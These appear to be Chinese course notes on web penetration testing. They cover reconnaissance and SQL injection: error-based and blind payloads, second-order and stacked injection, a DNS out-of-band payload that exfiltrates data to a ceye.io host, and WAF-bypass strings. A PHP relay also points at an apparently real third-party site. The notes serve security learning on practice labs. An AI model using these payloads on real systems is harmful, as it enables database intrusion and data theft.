<h3 id="day10-信息收集-资产监控拓展"><a href="#day10-信息收集-资产监控拓展" class="headerlink" title="day10-信息收集 资产监控拓展"></a>day10-信息收集 资产监控拓展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Github监控 -- 便于收集整理最新exp或poc -- 便于发现相关测试目标的资产</span><br><span class="line">	python写脚本去监测</span><br><span class="line">各种子域名查询 DNS,备案,证书 全球节点请求cdn</span><br><span class="line">-- 枚举爆破或解析子域名对应 -- 便于发现管理员相关的注册信息</span><br><span class="line">黑暗引擎相关搜索 -- fofa，shodan, zoomeye 微信公众号接口获取dgh</span><br></pre></td></tr></table></figure>

<p> <img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030862796.png" alt="图片"> </p>
<h4 id="github监控代码"><a href="#github监控代码" class="headerlink" title="github监控代码"></a>github监控代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">代码参考https://blog.csdn.net/weixin_45889197/ /details/119299883</span><br><span class="line">几处修改</span><br><span class="line">	requests而不是request</span><br><span class="line">	排版，参考博客基础上读代码修改空格和回车</span><br><span class="line">	server酱的调用方法参看它的api说明修改https://sct.ftqq.com/sendkey</span><br><span class="line">代码解析</span><br><span class="line">	很普通的爬虫</span><br><span class="line">	api.github.com/....这个页面的json格式化有待学习</span><br><span class="line">资源</span><br><span class="line">    https://crt.sh 							#查证书</span><br><span class="line">    https://dnsdb.io						#</span><br><span class="line">    https://sct.ftqq.com/login</span><br><span class="line">    https://tools.ipip.net/cdn.php			#免费 别的国家ping cdn</span><br><span class="line">    https://github.com/bit4woo/teemo		#信息搜集软件</span><br><span class="line">    https://securitytrails.com/domain/www.baidu.com/history/a	#查cdn</span><br><span class="line">0    https://www.opengps.cn/Data/IP/ipplus.aspx		#ip定位</span><br></pre></td></tr></table></figure>

<h3 id="day11-WEB漏洞-必懂知识点"><a href="#day11-WEB漏洞-必懂知识点" class="headerlink" title="day11-WEB漏洞 必懂知识点"></a>day11-WEB漏洞 必懂知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">资料</span><br><span class="line">	https://github.com/zhuifengshaonianhanlu/pikachu------靶场</span><br></pre></td></tr></table></figure>

<h3 id="day12-WEB漏洞-SQL简要"><a href="#day12-WEB漏洞-SQL简要" class="headerlink" title="day12-WEB漏洞 SQL简要"></a>day12-WEB漏洞 SQL简要</h3><p> <img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030896540.png" alt="图片"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqllab首次安装需要导入下security数据库，百度一下</span><br><span class="line">注入时需要信息收集 见下面</span><br><span class="line">mysql5.0之后才有information_schema</span><br><span class="line">D:\phpStudy\MySQL\bin&gt;mysql.exe -u root -p		也可以从win的phpstudy那个小软件进去</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\phpStudy\WWW\sql_lab\sqli-labs-master\sql-connections\sql-connect.php包含的db-creds.inc决定了用户权限，root为最高权限可以操作其他库，其他用户在本数据库user表去找或者创建</span><br><span class="line"></span><br><span class="line">信息收集</span><br><span class="line">    判断数据个数order by x 根据正确域错误的格式来判断个数，然后select 1,2,3,...</span><br><span class="line">    查询数据库 version()</span><br><span class="line">    数据库名字 database()</span><br><span class="line">    数据库用户 user() 使用数据库的用户</span><br><span class="line">    操作系统 @@version_compile_os</span><br></pre></td></tr></table></figure>

<h3 id="day13-WEB-MYSQL注入"><a href="#day13-WEB-MYSQL注入" class="headerlink" title="day13-WEB MYSQL注入"></a>day13-WEB MYSQL注入</h3><p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030915633.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sql-lab举例，/Less-2/index.php查看源文件 权限文件可知</span><br><span class="line">	/Less-2/index.php中包含/sql-connections/sql-connect</span><br><span class="line">	/sql-connections/sql-connect又包含/sql-connection/db-creds.inc</span><br><span class="line">	该文件设置了权限，默认root，说明从网页Less-2访问操作数据库使用的是root权限</span><br><span class="line">文件读写操作</span><br><span class="line">    load_file():读取函数 里面使用&#x27;/&#x27; 防止转译</span><br><span class="line">    	union select 1,2,load_file(&#x27;路径&#x27;)</span><br><span class="line">    	常见的load_file()读取的敏感信息</span><br><span class="line">    		https://blog.csdn.net/weixin_30292843/article/details/99381669</span><br><span class="line">    into outfile或into dumpfile:导出函数</span><br><span class="line">获取路径的常见方法</span><br><span class="line">    报错显示</span><br><span class="line">    	intext:warning inurl:php</span><br><span class="line">    遗留文件</span><br><span class="line">    	inurl:phpinfo.php</span><br><span class="line">    		script_filename结合搜索栏路径确定网站路径</span><br><span class="line">    漏洞报错</span><br><span class="line">    	通过搜到的漏洞</span><br><span class="line">    平台配置文件</span><br><span class="line">    	apache的D:\phpStudy\Apache\conf\vhosts.conf</span><br><span class="line">    爆破</span><br><span class="line">    </span><br><span class="line">magic_quotes_gpc在php.ini中可以找到注意向上向下查询</span><br><span class="line">    对应php中的addslashes()函数</span><br><span class="line">    当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线</span><br><span class="line">    	路径用hex编码可以绕过，不用单引号</span><br><span class="line">sqlmap字典在\data\txt目录下</span><br></pre></td></tr></table></figure>

<h3 id="day14-SQL注入-提交注入"><a href="#day14-SQL注入-提交注入" class="headerlink" title="day14-SQL注入 提交注入"></a>day14-SQL注入 提交注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#简要明确参数类型</span><br><span class="line">	数字，字符，搜索，JSON等</span><br><span class="line">    数字可以直接加在sql中</span><br><span class="line">    字符就要通过单双引号接入sql语句中</span><br><span class="line"></span><br><span class="line">#简要明确请求方法</span><br><span class="line">	GET, POST, COOKIE, REQUEST, HTTP头等</span><br><span class="line">	$c = $_COOKIE[&#x27;x&#x27;]	传键值对x</span><br><span class="line">	$s = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]	这个变量可以获取操作系统的信息</span><br><span class="line">		搜索$_SERVER查看具体</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其中SQI语句干扰符号:  &#x27;, &quot;, %, ), &#125; 等，具体需看写法</span><br><span class="line">&#x27;&quot;]&#125;)可以作为默认测试写法</span><br><span class="line"></span><br><span class="line">curl -X POST https://api.zoomeye.org/user/login -d</span><br><span class="line">&#123;</span><br><span class="line"> &quot;username&quot;: &quot;foo@bar.com&quot;,</span><br><span class="line"> &quot;password&quot;: &quot;foobar&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- sql-lab</span></span><br><span class="line"><span class="comment">-- Less-5</span></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"><span class="comment">-- Less-6</span></span><br><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;		<span class="comment">-- 相当于多了双引号 .是字符连接符</span></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"><span class="comment">-- Less-11	post</span></span><br><span class="line"><span class="comment">-- Less-20 	cookie	post和cookie两个sql语句</span></span><br><span class="line"><span class="comment">-- Less-18  $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]	insert注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--json 注入</span></span><br><span class="line">json<span class="operator">=</span>&#123;&quot;username&quot;:&quot;Dumb&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>#&#125;</span><br></pre></td></tr></table></figure>



<h3 id="day15-SQL注入之Oracle、MongoDB等注入"><a href="#day15-SQL注入之Oracle、MongoDB等注入" class="headerlink" title="day15-SQL注入之Oracle、MongoDB等注入"></a>day15-SQL注入之Oracle、MongoDB等注入</h3><p> <img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640-1688030938593.png" alt="图片"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">简要学习各种数据库的注入特点</span><br><span class="line">    Access(asp), mysql, mssql(sql server), mongoDB, postgresql, sqlite,oracle, sybase等</span><br><span class="line">    Access数据库放在网站下</span><br><span class="line">	access只有一个数据库，会保存在网站源码下面，没有文件写入等操作,没有information_schema</span><br><span class="line">		墨者靶场Access,用字典去猜,如果猜不到怎么办?</span><br><span class="line">			union select 1,username,passwd,4 from admin</span><br><span class="line">		墨者靶场sql server postgresql oracle mongDB</span><br><span class="line">			</span><br><span class="line">		</span><br><span class="line">数据库架构组成，数据库高权限操作</span><br><span class="line"></span><br><span class="line">连接数据库的文件决定了谁连接数据库，享有怎样的权限，没有information_schema</span><br><span class="line"></span><br><span class="line">简要学习各种注入工具的使用指南</span><br><span class="line">熟悉工具的支持库，注入模式，优缺点等</span><br><span class="line">Sqlmap, NoSQLAttack, Pangolin等</span><br><span class="line"></span><br><span class="line">涉及资源</span><br><span class="line">    https://www.cnblogs.com/xishaonian/p/6173644.html </span><br><span class="line">    https://www.cnblogs.com/bmjoker/p/9326258.html </span><br><span class="line">    https://github.com/youngyangyang04/NoSQL Attack  linux环境下支持</span><br><span class="line">    MongoDB的工具，P14 https://github.com/sqlmapproject/sqlmap </span><br><span class="line">    https://blog.csdn.net/qq_39936434/category_9103379.html </span><br><span class="line">    https://blog.csdn.net/hack8/article/details/6427911</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果数据库类型判断错误，注入一定会失败</span><br><span class="line">关于注入工具可以抓包来看如何进行注入来学习</span><br><span class="line">mssq l注入参考</span><br><span class="line">https://blog.csdn.net/hhhshd/article/details/121356157</span><br><span class="line">postgresql注入参考</span><br><span class="line">https://www.cnblogs.com/yilishazi/p/14710349.html</span><br><span class="line">sqlmap全参数详解</span><br><span class="line">https://blog.csdn.net/Breeze_CAT/article/details/80628392</span><br><span class="line"></span><br><span class="line">sqlmap不支持mongodb，资料有支持的工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json注入 如果需要闭合，闭合的是sql语句的单引号或双引号，判断value值是数字还是字符</span><br></pre></td></tr></table></figure>

<h3 id="day16-SQL注入之查询方式及报错盲注"><a href="#day16-SQL注入之查询方式及报错盲注" class="headerlink" title="day16-SQL注入之查询方式及报错盲注"></a>day16-SQL注入之查询方式及报错盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- select查询数据 在网站应用中进行数据显示查询操作</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"><span class="comment">-- insert插入数据 在网站应用中进行用户注册添加等操作</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> news (id, url, text) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;$t&#x27;</span>)</span><br><span class="line"><span class="comment">-- delete删除数据 后台管理里面删除文章删除用户等操作</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id </span><br><span class="line"><span class="comment">-- update更新数据 会员或后台中心数据同步或缓存等操作</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;$p&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"><span class="comment">-- order by排序数据 一般结合表名或列名进行数据排序操作</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $id</span><br><span class="line"><span class="keyword">select</span> id, name, price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br><span class="line">重点理解:</span><br><span class="line">我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的<span class="keyword">SQL</span>查询方式</span><br><span class="line"> </span><br><span class="line">pikachu漏洞练习平台</span><br><span class="line">	<span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sql_str.php				字符注入</span><br><span class="line">	<span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_iu<span class="operator">/</span>sql_login.php	<span class="keyword">insert</span><span class="operator">/</span><span class="keyword">update</span>注入</span><br><span class="line"></span><br><span class="line">盲注分为三类</span><br><span class="line">	逻辑判断</span><br><span class="line">		regexp,<span class="keyword">like</span>,ascii,<span class="keyword">left</span>,mid</span><br><span class="line">	延时判断		最慢</span><br><span class="line">		if,sleep</span><br><span class="line">	报错回显		最快</span><br><span class="line">		floor,updatexml,extractvalue</span><br><span class="line">			https:<span class="operator">/</span><span class="operator">/</span>www.jianshu.com<span class="operator">/</span>p<span class="operator">/</span>bc35f8dd4f7c</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pikachu <span class="keyword">insert</span>		<span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sqli_iu<span class="operator">/</span>sqli_reg.php</span><br><span class="line">	执行上面类似的<span class="keyword">insert</span>语句			<span class="number">0x7e</span>是波浪号</span><br><span class="line">		floor</span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or (select 1 from(select count(*),concat((select(select(select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span><span class="operator">&amp;</span>password...</span><br><span class="line">		updatexml</span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span><span class="operator">&amp;</span>password...</span><br><span class="line">		extractvalue</span><br><span class="line">username<span class="operator">=</span>x<span class="string">&#x27; or extractvalue(1, concat(0x7e,database())) or &#x27;</span><span class="operator">&amp;</span>password...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pikachu update		/pikachu/vul/sqli/sqli_iu/sqli_edit.php</span><br><span class="line">以下正常post提交，选择注入点要考虑到注入点可能的闭合情况 跟上面的差不多</span><br><span class="line">sex=%E7%94%B7&amp;phonenum=12345678901&amp;add=111&amp;email=111&amp;submit=submit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">布尔逻辑判断			见dvwa</span><br><span class="line">	like &#x27;ro%&#x27;     				#判断ro或ro.. .是否成立</span><br><span class="line">    regexp &#x27;^xiaodi[a-z]&#x27;   	#匹配xiaodi及xiaodi...等</span><br><span class="line">    if(条件,5,0)    				#条件成立返回5反之返回0</span><br><span class="line">    sleep(5)     				#sQI语句延时执行5秒</span><br><span class="line">    mid(a,b,c)     				#从位置b开始，截取a字符串的c位</span><br><span class="line">    substr(a,b,c)    			#从b位置开始，截取字符串a的c长度</span><br><span class="line">    left(database(),1),database() #left(a,b)从左侧截取a的前b位</span><br><span class="line">    length(database())=8   		#判断数据库database ()名的长度</span><br><span class="line">    ord=ascii ascii(x)=97   	#判断x的asci i码是否等于97</span><br></pre></td></tr></table></figure>

<h3 id="day17-SQL注入之二次，加解密，DNS等注入"><a href="#day17-SQL注入之二次，加解密，DNS等注入" class="headerlink" title="day17-SQL注入之二次，加解密，DNS等注入"></a>day17-SQL注入之二次，加解密，DNS等注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">加解密</span><br><span class="line">    sqllab Less-21 cookie里面uname base64加密	</span><br><span class="line">        但是我的抓包这关是post提交不没有加密</span><br><span class="line">        代码里面base64_decode($cookee)</span><br><span class="line">        使用报错注入</span><br><span class="line">        1=》base64-》MQ==</span><br><span class="line">        谷歌 inurl:id=MQ==</span><br><span class="line">二次注入		一般白盒有代码</span><br><span class="line">	1.插入恶意数据</span><br><span class="line">		第一次进行数据库插入数据时，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据 本身包含恶意内容</span><br><span class="line">	2.引用恶意内容</span><br><span class="line">		在将数据存入到数据库中之后，开发者就认为数据时可信的。在下次需要进行查询的时候，直接进行进一步的检验和处理，这样就造成了二次注入。</span><br><span class="line">	Less-24</span><br><span class="line">		注册用户admin&#x27;#,在修改代码页面/sqllab/sqllab/Less-24/logged-in.php可以随便修改admin的密码，这个文件修改的密码会传到pass_change.php</span><br><span class="line">		$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br><span class="line">	搜索 cms 二次注入</span><br><span class="line">DNS带外注入			注入点是高权限	 文件读取权限</span><br><span class="line">	#设置MYSQL服务的导入导出 	NULL禁止		/tmp/只能在/tmp	&quot;&quot;不做限制</span><br><span class="line">	secure_file_priv=&quot;&quot;</span><br><span class="line">	ceye.io		微信登录	http://ceye.io/profile</span><br><span class="line">	http://192.168.88.1/sqllab/sqllab/Less-2/?id=1 and if((select load_file(concat(&#x27;\\\\&#x27;,(select version()),&#x27;.xgypw9.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql执行				这个需要在my.ini中加入</span><br><span class="line">	<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> if((<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.xgypw9.ceye.io&#x27;</span>))),<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">	会在ceye.io网站产生互联显示注入查询的信息		也没成功</span><br><span class="line">		https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>ADOOO<span class="operator">/</span>DnslogSqlinj		dns注入工具</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sqlmap base64中转注入	对下面这个文件的x进行注入</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://job.gxu.edu.cd/job_bystjb/yjs_byszjs.asp?id=&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line"><span class="variable">$urls</span> = <span class="variable">$url</span>.<span class="variable">$payload</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$urls</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$urls</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#此处结果是脚本接收没有同步到sqlmap</span></span><br></pre></td></tr></table></figure>

<h3 id="day18-SQL注入之堆叠及WAF绕过注入"><a href="#day18-SQL注入之堆叠及WAF绕过注入" class="headerlink" title="day18-SQL注入之堆叠及WAF绕过注入"></a>day18-SQL注入之堆叠及WAF绕过注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stacked injections(堆叠注入)</span><br><span class="line">select * from users;select * from emails;</span><br><span class="line">Less-38</span><br><span class="line">$sql = &quot;SELECT * from users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$id = 1&#x27;; insert....;</span><br><span class="line">注入需要管理员账号密码，密码是加密，无法解密</span><br><span class="line">堆叠注入进行插入数据，用户密码自定义</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">waf绕过</span><br><span class="line">	数据</span><br><span class="line">		大小写</span><br><span class="line">		加密解密</span><br><span class="line">		编码解码</span><br><span class="line">		等价函数</span><br><span class="line">		特殊符号</span><br><span class="line">		反序列号</span><br><span class="line">		注释符混用</span><br><span class="line">	方式</span><br><span class="line">		更改提交方式</span><br><span class="line">		变异</span><br><span class="line">	其他</span><br><span class="line">		Fuzz大法</span><br><span class="line">		数据库特性</span><br><span class="line">		垃圾数据溢出</span><br><span class="line">		HTTP参数污染</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">阿里云盾 宝塔 安全狗			#waf ids ips</span><br><span class="line"></span><br><span class="line">正则表达式 匹配关键字</span><br><span class="line"></span><br><span class="line">select ~database();		一串数字</span><br><span class="line">select * from users where id = -1 union/**/select 1, 2, 3;</span><br><span class="line"># bypass sqlinject payload</span><br><span class="line">	%23		#</span><br><span class="line">	%0A		回车换行</span><br><span class="line">	%00		url终止符</span><br><span class="line">id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23</span><br><span class="line">id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23</span><br><span class="line"></span><br><span class="line">id=-1%20union%20/*!44509select*/%201,2,3%23</span><br><span class="line">id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23</span><br><span class="line"></span><br><span class="line">id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br><span class="line"></span><br><span class="line">id=-1 %20union%20all%23%0a%20select%201,2,3%23</span><br><span class="line">-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">安全狗  sqllab Less<span class="number">-1</span></span><br><span class="line">	安全狗很多拦截方式都是url(<span class="keyword">get</span>)可以更改提交方式 </span><br><span class="line">	  如果后端接受用$_REQUEST  <span class="keyword">get</span>和post互换提交方式  </span><br><span class="line">#防止查询数据库相关信息 	url cookie post 		匹配整体database()</span><br><span class="line">	id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database<span class="comment">/**/</span>(), <span class="number">3</span>;</span><br><span class="line">#防止<span class="keyword">SQL</span>联合查询			匹配&quot;union select&quot;整体</span><br><span class="line">#改成<span class="keyword">get</span>请求绕过		能过安全狗能过数据库</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="comment">/*%00*/</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>A<span class="comment">/*!/*!select 1,2,3*/</span>;<span class="operator">%</span><span class="number">23</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span><span class="operator">%</span><span class="number">23</span>a<span class="operator">%</span><span class="number">0</span>A<span class="comment">/*!/*!select 1,2,3*/</span>;<span 